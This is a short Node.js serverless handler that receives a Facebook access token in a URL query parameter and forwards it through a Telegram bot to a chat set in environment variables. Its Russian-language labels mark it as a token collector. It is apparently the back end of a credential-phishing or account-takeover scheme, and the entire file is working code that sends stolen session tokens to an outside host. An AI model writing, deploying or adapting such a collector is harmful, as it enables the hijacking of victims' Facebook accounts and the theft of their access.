const { Telegraf } = require('telegraf');

const BOT_TOKEN = process.env.BOT_TOKEN || '';
const CHAT_ID = process.env.CHAT_ID || '';

const bot = new Telegraf(BOT_TOKEN);

module.exports = async (req, res) => {
  if (req.method !== 'GET') {
    return res.status(405).send('Method Not Allowed');
  }

  const { access_token } = req.query;

  if (!access_token) {
    return res.status(400).send('Missing access_token');
  }

  try {
    await bot.telegram.sendMessage(
      CHAT_ID,
      `🔑 Facebook токен:\n\n\`${access_token}\``,
      { parse_mode: 'Markdown' }
    );

    res.status(200).send(`Token отправлен в Telegram!\nToken: ${access_token}`);
  } catch (error) {
    console.error('Ошибка:', error);
    res.status(500).send('Ошибка при отправке токена');
  }
};
